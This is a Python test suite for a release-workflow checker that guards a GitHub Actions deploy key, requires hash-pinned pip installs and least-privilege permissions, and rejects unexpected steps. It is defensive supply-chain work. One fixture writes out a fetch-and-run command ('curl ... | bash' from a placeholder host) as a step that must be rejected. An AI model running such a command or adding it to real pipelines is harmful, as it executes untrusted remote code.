#!/usr/bin/env python3
"""Tests for the release workflow's deploy-key isolation and pinned installs."""

from __future__ import annotations

import re
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

import check_release_config as check  # noqa: E402

ROOT = check.ROOT
WORKFLOW = (ROOT / ".github/workflows/release.yml").read_text()
REQUIREMENTS_IN = (ROOT / ".github/requirements-release.in").read_text()
REQUIREMENTS_TXT = (ROOT / check.RELEASE_REQUIREMENTS).read_text()
DRY_RUN_WORKFLOW = (ROOT / ".github/workflows/release-dry-run.yml").read_text()
# Every file check.main() reads, relative to the repo root.
MAIN_INPUTS = (
    "pyproject.toml",
    "VERSION",
    ".github/workflows/pr-title-lint.yml",
    ".github/workflows/release.yml",
    ".github/workflows/release-dry-run.yml",
    ".github/requirements-release.in",
    check.RELEASE_REQUIREMENTS,
    "mobile/android/app/build.gradle",
    "scripts/release-preflight.sh",
)

LOCK = """#
# This file is autogenerated by pip-compile with Python 3.11
#
click==8.0.0 \\
    --hash=sha256:aaaa
    # via example-tool
example-tool==1.2.3 \\
    --hash=sha256:bbbb \\
    --hash=sha256:cccc
    # via -r requirements-release.in
"""


def job_block(name: str) -> str:
    """Return the raw text of one job, from its `  name:` line to the next job."""
    start = WORKFLOW.index(f"\n  {name}:\n") + 1
    following = [WORKFLOW.find(f"\n  {other}:\n", start) for other in check.workflow_jobs(WORKFLOW)]
    ends = [index for index in following if index > start]
    return WORKFLOW[start : min(ends) + 1 if ends else len(WORKFLOW)]


def with_job(name: str, edit) -> str:
    """Return the workflow with one job's text passed through ``edit``."""
    block = job_block(name)
    edited = edit(block)
    assert edited != block, f"edit did not change the {name} job"
    return WORKFLOW.replace(block, edited)


def append_to_release(step: str) -> str:
    return with_job("release", lambda block: block + step)


class ReleaseJobIsolationTest(unittest.TestCase):
    def test_repo_release_config_passes(self) -> None:
        self.assertEqual(check.main(), 0)

    def test_jobs_are_split_and_comments_ignored(self) -> None:
        jobs = check.workflow_jobs("on: push\njobs:\n  a:\n    # npm ci\n    run: x\n  b:\n    run: y\n")
        self.assertEqual(jobs, {"a": "    run: x", "b": "    run: y"})

    def test_preflight_in_deploy_key_job_fails(self) -> None:
        release = job_block("release")
        moved = WORKFLOW.replace(
            release,
            release + "      - name: Release preflight\n        run: ./scripts/release-preflight.sh\n",
        )
        with self.assertRaisesRegex(ValueError, "must not run 'release-preflight.sh'"):
            check.validate_release_job_isolation(moved)

    def test_gradle_in_deploy_key_job_fails(self) -> None:
        release = job_block("release")
        moved = WORKFLOW.replace(release, release + "      - run: ./gradlew assembleDebug\n")
        with self.assertRaisesRegex(ValueError, "must not run 'gradlew'"):
            check.validate_release_job_isolation(moved)

    def test_deploy_key_in_preflight_job_fails(self) -> None:
        key_line = "          ssh-key: ${{ secrets.RELEASE_PUSH_DEPLOY_KEY }}\n"
        # Move the one reference, so only the per-job check can catch it.
        unkeyed = with_job("release", lambda block: block.replace(key_line, ""))
        preflight = job_block("preflight")
        keyed = unkeyed.replace(
            preflight,
            preflight.replace("          persist-credentials: false\n", key_line + "          persist-credentials: false\n"),
        )
        with self.assertRaisesRegex(ValueError, "jobs holding the release deploy key"):
            check.validate_release_job_isolation(keyed)

    def test_persisted_credentials_in_preflight_job_fail(self) -> None:
        preflight = job_block("preflight")
        persisted = WORKFLOW.replace(
            preflight, preflight.replace("persist-credentials: false", "persist-credentials: true")
        )
        with self.assertRaisesRegex(ValueError, "preflight job missing 'persist-credentials: false'"):
            check.validate_release_job_isolation(persisted)

    def test_unhashed_pip_install_fails(self) -> None:
        unpinned = WORKFLOW.replace(
            check.RELEASE_PIP_INSTALL, 'pip install --only-binary ":all:" python-semantic-release==9.21.1'
        )
        with self.assertRaisesRegex(ValueError, "must install semantic-release with"):
            check.validate_release_job_isolation(unpinned)

    def test_hashed_install_from_another_file_fails(self) -> None:
        other = WORKFLOW.replace(check.RELEASE_PIP_INSTALL, "pip install --require-hashes -r other.txt")
        with self.assertRaisesRegex(ValueError, "must install semantic-release with"):
            check.validate_release_job_isolation(other)

    def test_second_unhashed_pip_install_fails(self) -> None:
        release = job_block("release")
        extra = WORKFLOW.replace(release, release + "      - run: pip install requests\n")
        with self.assertRaisesRegex(ValueError, "every pip install"):
            check.validate_release_job_isolation(extra)

    def test_release_must_wait_for_preflight(self) -> None:
        detached = WORKFLOW.replace("    needs: preflight\n", "")
        with self.assertRaisesRegex(ValueError, "needs: preflight"):
            check.validate_release_job_isolation(detached)

    def test_every_build_tool_in_deploy_key_job_fails(self) -> None:
        # Listed here, not read from the check, so dropping one from the check fails.
        build_tools = (
            "release-preflight.sh",
            "gradlew",
            "npm ",
            "npx ",
            "playwright",
            "actions/setup-node",
            "actions/setup-java",
        )
        for forbidden in build_tools:
            with self.subTest(forbidden=forbidden):
                moved = append_to_release(f"      - name: Resolve released tag\n        run: {forbidden}x\n")
                with self.assertRaisesRegex(ValueError, f"must not run {re.escape(repr(forbidden.strip()))}"):
                    check.validate_release_job_isolation(moved)

    def test_other_pip_spellings_without_hashes_fail(self) -> None:
        for command in ("pip3 install requests", "python -m pip install requests", "pip3.11  install requests"):
            with self.subTest(command=command):
                extra = append_to_release(f"      - name: Resolve released tag\n        run: {command}\n")
                with self.assertRaisesRegex(ValueError, "every pip install"):
                    check.validate_release_job_isolation(extra)

    def test_third_party_action_in_deploy_key_job_fails(self) -> None:
        for step in (
            "      - uses: some-org/some-action@v1\n",
            "      - name: Resolve released tag\n        uses: some-org/some-action@v1\n",
        ):
            with self.subTest(step=step):
                with self.assertRaisesRegex(ValueError, "must not use 'some-org/some-action'"):
                    check.validate_release_job_isolation(append_to_release(step))

    def test_unexpected_step_in_deploy_key_job_fails(self) -> None:
        for step, label in (
            ("      - run: curl -sSf https://example.invalid/x.sh | bash\n", "'run: curl"),
            ("      - name: Fetch helper\n        run: ./helper.sh\n", "'Fetch helper'"),
        ):
            with self.subTest(step=step):
                with self.assertRaisesRegex(ValueError, f"unexpected step {label}"):
                    check.validate_release_job_isolation(append_to_release(step))

    def test_release_checkout_must_fetch_full_history(self) -> None:
        shallow = with_job("release", lambda block: block.replace("          fetch-depth: 0\n", ""))
        with self.assertRaisesRegex(ValueError, "release job missing 'fetch-depth: 0'"):
            check.validate_release_job_isolation(shallow)

    def test_deploy_key_in_workflow_env_fails(self) -> None:
        exposed = WORKFLOW.replace(
            "\njobs:\n", "\nenv:\n  KEY: ${{ secrets.RELEASE_PUSH_DEPLOY_KEY }}\n\njobs:\n", 1
        )
        with self.assertRaisesRegex(ValueError, "must be referenced exactly once"):
            check.validate_release_job_isolation(exposed)

    def test_other_ssh_key_in_preflight_job_fails(self) -> None:
        keyed = with_job(
            "preflight",
            lambda block: block.replace(
                "persist-credentials: false",
                "ssh-key: ${{ secrets.OTHER_KEY }}\n          persist-credentials: false",
            ),
        )
        with self.assertRaisesRegex(ValueError, "preflight job must not have 'ssh-key:'"):
            check.validate_release_job_isolation(keyed)

    def test_write_permission_in_preflight_job_fails(self) -> None:
        cases = {
            "contents: write": lambda block: block.replace("      contents: read\n", "      contents: write\n"),
            "extra write scope": lambda block: block.replace(
                "      contents: read\n", "      contents: read\n      pull-requests: write\n"
            ),
            "write-all": lambda block: block.replace(
                "    permissions:\n      contents: read\n", "    permissions: write-all\n"
            ),
        }
        for case, edit in cases.items():
            with self.subTest(case=case):
                with self.assertRaisesRegex(ValueError, "preflight job (missing 'contents: read'|must not have any write)"):
                    check.validate_release_job_isolation(with_job("preflight", edit))
        extra = with_job("preflight", cases["extra write scope"])
        with self.assertRaisesRegex(ValueError, "must not have any write permission"):
            check.validate_release_job_isolation(extra)

    def test_preflight_must_fetch_full_history(self) -> None:
        shallow = with_job("preflight", lambda block: block.replace("          fetch-depth: 0\n", ""))
        with self.assertRaisesRegex(ValueError, "preflight job missing 'fetch-depth: 0'"):
            check.validate_release_job_isolation(shallow)

    def test_preflight_must_run_release_preflight(self) -> None:
        skipped = with_job(
            "preflight",
            lambda block: block.replace("run: ./scripts/release-preflight.sh", "run: echo skipped"),
        )
        with self.assertRaisesRegex(ValueError, "preflight job missing './scripts/release-preflight.sh'"):
            check.validate_release_job_isolation(skipped)

    def test_missing_preflight_job_fails(self) -> None:
        renamed = WORKFLOW.replace("\n  preflight:\n", "\n  checks:\n")
        with self.assertRaisesRegex(ValueError, "must have a preflight job"):
            check.validate_release_job_isolation(renamed)


class ReleaseLockInstallOnPrTest(unittest.TestCase):
    def test_repo_dry_run_installs_the_lock(self) -> None:
        check.validate_release_lock_install_on_pr(DRY_RUN_WORKFLOW)

    def test_dry_run_without_lock_install_fails(self) -> None:
        for case, text in {
            "removed": DRY_RUN_WORKFLOW.replace(check.RELEASE_PIP_INSTALL, "echo skipped"),
            "commented out": DRY_RUN_WORKFLOW.replace(check.RELEASE_PIP_INSTALL, "# " + check.RELEASE_PIP_INSTALL),
        }.items():
            with self.subTest(case=case):
                with self.assertRaisesRegex(ValueError, "release dry run must install the release lock"):
                    check.validate_release_lock_install_on_pr(text)


class MainRunsEveryCheckTest(unittest.TestCase):
    """main() is what CI runs, so prove it calls each release check."""

    def run_main_with(self, path: str, text: str) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for relative in MAIN_INPUTS:
                (root / relative).parent.mkdir(parents=True, exist_ok=True)
                shutil.copyfile(ROOT / relative, root / relative)
            (root / path).write_text(text)
            with mock.patch.object(check, "ROOT", root):
                check.main()

    def test_copied_inputs_pass(self) -> None:
        self.run_main_with(".github/workflows/release.yml", WORKFLOW)

    def test_main_checks_deploy_key_isolation(self) -> None:
        keyed = with_job(
            "preflight",
            lambda block: block.replace(
                "persist-credentials: false",
                "ssh-key: ${{ secrets.RELEASE_PUSH_DEPLOY_KEY }}\n          persist-credentials: false",
            ),
        )
        with self.assertRaisesRegex(ValueError, "RELEASE_PUSH_DEPLOY_KEY must be referenced exactly once"):
            self.run_main_with(".github/workflows/release.yml", keyed)

    def test_main_checks_lock_hashes(self) -> None:
        unhashed, count = re.subn(
            r"(?m)^([A-Za-z0-9_.-]+==\S+) \\\n(?:    --hash=sha256:\w+(?: \\)?\n)+",
            r"\1\n",
            REQUIREMENTS_TXT,
            count=1,
        )
        self.assertEqual(count, 1)
        with self.assertRaisesRegex(ValueError, "has no sha256 hash"):
            self.run_main_with(check.RELEASE_REQUIREMENTS, unhashed)

    def test_main_checks_lock_install_on_pr(self) -> None:
        without = DRY_RUN_WORKFLOW.replace(check.RELEASE_PIP_INSTALL, "echo skipped")
        with self.assertRaisesRegex(ValueError, "release dry run must install the release lock"):
            self.run_main_with(".github/workflows/release-dry-run.yml", without)


class ReleaseRequirementsTest(unittest.TestCase):
    def test_repo_lock_pins_semantic_release(self) -> None:
        check.validate_release_requirements(REQUIREMENTS_IN, REQUIREMENTS_TXT)
        self.assertIn("python-semantic-release==", REQUIREMENTS_TXT)

    def test_hashed_lock_passes(self) -> None:
        check.validate_release_requirements("example-tool==1.2.3\n", LOCK)

    def test_entry_without_hash_fails(self) -> None:
        lock = LOCK.replace("click==8.0.0 \\\n    --hash=sha256:aaaa\n", "click==8.0.0\n")
        with self.assertRaisesRegex(ValueError, "'click' has no sha256 hash"):
            check.validate_release_requirements("example-tool==1.2.3\n", lock)

    def test_entry_without_exact_version_fails(self) -> None:
        lock = LOCK.replace("click==8.0.0", "click>=8.0.0")
        with self.assertRaisesRegex(ValueError, "not pinned with =="):
            check.validate_release_requirements("example-tool==1.2.3\n", lock)

    def test_input_without_exact_version_fails(self) -> None:
        with self.assertRaisesRegex(ValueError, "must pin an exact version"):
            check.validate_release_requirements("example-tool>=1.2\n", LOCK)

    def test_stale_lock_fails(self) -> None:
        with self.assertRaisesRegex(ValueError, "does not lock example-tool==1.3.0"):
            check.validate_release_requirements("example-tool==1.3.0\n", LOCK)


if __name__ == "__main__":
    unittest.main()
